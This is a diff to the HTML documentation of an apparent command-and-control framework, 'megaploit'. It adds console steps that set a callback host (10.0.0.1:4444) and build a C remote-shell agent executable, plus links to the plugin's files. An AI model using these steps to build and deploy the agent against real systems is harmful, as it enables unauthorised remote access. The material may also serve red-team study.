@@ -2131,8 +2131,13 @@ or reject your client:</p>
 </table>
 <p>Required linker libraries:
 <code>Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib  Advapi32.lib  User32.lib</code></p>
-<p>Build via the C2 console:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>megaploit&gt; generate_c 10.0.0.1 4444
+<p>Build via the C2 console using the bundled plugin:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>megaploit [0] » set lhost 10.0.0.1
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>megaploit [0] » set port 4444
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>megaploit [0] » crs_build
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a># [*] Using MinGW: x86_64-w64-mingw32-gcc
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a># [+] Build OK → C-remote-shell/megaploit_c_agent.exe
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a># [*] Drop &#39;secret.key&#39; alongside the EXE before deploying.
 </span></code></pre></div>
 <p>Or manually with the Makefile:</p>
 <div class="language-bat highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="k">cd</span> C-remote-shell
@@ -2140,6 +2145,8 @@ or reject your client:</p>
 </span></code></pre></div>
 <hr />
 <p><em>See also:</em>
+- <a href="../plugins/c_remote_shell.toml"><code>plugins/c_remote_shell.toml</code></a> — C-remote-shell plugin descriptor
+- <a href="../plugins/c_remote_shell.py"><code>plugins/c_remote_shell.py</code></a> — C-remote-shell plugin Python handlers
 - <a href="../plugins/native_sdk/megaploit_protocol.h"><code>plugins/native_sdk/megaploit_protocol.h</code></a> — single-header protocol library
 - <a href="../plugins/native_sdk/example_plugin.cpp"><code>plugins/native_sdk/example_plugin.cpp</code></a> — working native plugin example
 - <a href="../plugins/native_sdk/example_native.toml"><code>plugins/native_sdk/example_native.toml</code></a> — plugin descriptor for the example
